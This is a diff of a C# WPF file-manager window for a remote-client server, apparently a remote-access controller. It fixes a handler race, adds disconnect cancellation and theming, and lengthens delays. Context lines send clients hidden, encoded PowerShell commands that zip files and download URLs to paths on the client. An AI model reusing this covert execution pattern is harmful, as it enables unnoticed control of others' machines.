@@ -37,9 +37,13 @@ public partial class FileManagerWindow : ThemedWindow
 
         _server.RegisterHandler(clientId, PacketType.FmListResult, pkt => { _pendingList?.TrySetResult(pkt.Data); });
         // FmFileData is used by both Download and Preview — route to whichever is waiting.
-        // Separate fields prevent the race where a mid-download selection change overwrites
-        // _pendingData with Preview's TCS, causing the download to time out.
-        _server.RegisterHandler(clientId, PacketType.FmFileData,   pkt => { (_pendingData ?? _pendingPreview)?.TrySetResult(pkt.Data); });
+        // Explicit if/else prevents a single response completing both TCS instances when they
+        // happen to be set simultaneously (e.g. rapid selection change during download).
+        _server.RegisterHandler(clientId, PacketType.FmFileData, pkt =>
+        {
+            if (_pendingData != null) _pendingData.TrySetResult(pkt.Data);
+            else _pendingPreview?.TrySetResult(pkt.Data);
+        });
         _server.RegisterHandler(clientId, PacketType.FmHashResult,  pkt => { _pendingHash?.TrySetResult(pkt.Data); });
         _server.RegisterHandler(clientId, PacketType.FmAck,         pkt => { _pendingAck?.TrySetResult(pkt.Data); });
 
@@ -74,12 +78,14 @@ public partial class FileManagerWindow : ThemedWindow
         };
         Lang.LanguageChanged += ApplyLanguage;
         ApplyLanguage();
+        _server.ClientDisconnected += OnClientDisconnected;
         Closed += (_, _) =>
         {
             _server.UnregisterHandler(clientId, PacketType.FmListResult);
             _server.UnregisterHandler(clientId, PacketType.FmFileData);
             _server.UnregisterHandler(clientId, PacketType.FmHashResult);
             _server.UnregisterHandler(clientId, PacketType.FmAck);
+            _server.ClientDisconnected -= OnClientDisconnected;
             Lang.LanguageChanged -= ApplyLanguage;
         };
         // MediaOpened fires when WMF has fully opened the file — safe moment to call Play()
@@ -639,7 +645,8 @@ public partial class FileManagerWindow : ThemedWindow
             Title = Lang.Get("FM_SET_ATTRS"), Width = 280, Height = 200,
             WindowStartupLocation = WindowStartupLocation.CenterScreen,
             ResizeMode = ResizeMode.NoResize,
-            Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24))
+            Background = (Application.Current.TryFindResource("WindowBgBrush") as System.Windows.Media.Brush)
+                      ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24))
         };
         var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(16) };
         sp.Children.Add(new System.Windows.Controls.TextBlock
@@ -790,7 +797,7 @@ public partial class FileManagerWindow : ThemedWindow
                 Data = $"SET \"SERO_SRC={path}\"&& SET \"SERO_DST={dest}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
             });
             TxtStatus.Text = string.Format(Lang.Get("FM_ZIPPING"), row.Name);
-            await Task.Delay(2000);
+            await Task.Delay(8000);
             ServerWindow.ReportGlobalActivity("Zip item", row.Name, "complete");
             ServerWindow.LogGlobal($"[FM] Zip command executed for '{path}' on client {_clientId}.");
             await Navigate(_currentPath);
@@ -841,7 +848,7 @@ public partial class FileManagerWindow : ThemedWindow
                 Data = $"SET \"SERO_URL={url}\"&& SET \"SERO_OUT={dest}\"&& powershell -NoP -NonI -W H -EncodedCommand {enc}"
             });
             TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOADING"), filename);
-            await Task.Delay(3000);
+            await Task.Delay(8000);
             ServerWindow.ReportGlobalActivity("Download URL", filename, "complete");
             ServerWindow.LogGlobal($"[FM] Download URL command executed for '{url}' on client {_clientId}.");
             await Navigate(_currentPath);
@@ -901,6 +908,18 @@ public partial class FileManagerWindow : ThemedWindow
         await Navigate(path);
     }
 
+    // ── Disconnect handling ──────────────────────────────────────────────────
+
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        _pendingList?.TrySetCanceled();
+        _pendingData?.TrySetCanceled();
+        _pendingPreview?.TrySetCanceled();
+        _pendingHash?.TrySetCanceled();
+        _pendingAck?.TrySetCanceled();
+    }
+
     // ── Helpers ─────────────────────────────────────
 
     private static string? PromptInput(string label, string defaultVal = "")
@@ -910,7 +929,8 @@ public partial class FileManagerWindow : ThemedWindow
             Title = Lang.Get("DLG_INPUT_TITLE"), Width = 380, Height = 130,
             WindowStartupLocation = WindowStartupLocation.CenterScreen,
             ResizeMode = ResizeMode.NoResize,
-            Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 18, 34))
+            Background = (Application.Current.TryFindResource("WindowBgBrush") as System.Windows.Media.Brush)
+                      ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(18, 18, 34))
         };
         var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(16) };
         sp.Children.Add(new System.Windows.Controls.TextBlock
@@ -921,7 +941,8 @@ public partial class FileManagerWindow : ThemedWindow
         var tb = new System.Windows.Controls.TextBox
         {
             Text = defaultVal,
-            Background = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24)),
+            Background = (Application.Current.TryFindResource("WindowBgBrush") as System.Windows.Media.Brush)
+                      ?? new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(12, 13, 24)),
             Foreground = System.Windows.Media.Brushes.White,
             BorderBrush = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(42, 48, 88)),
             Padding = new Thickness(6, 4, 6, 4),
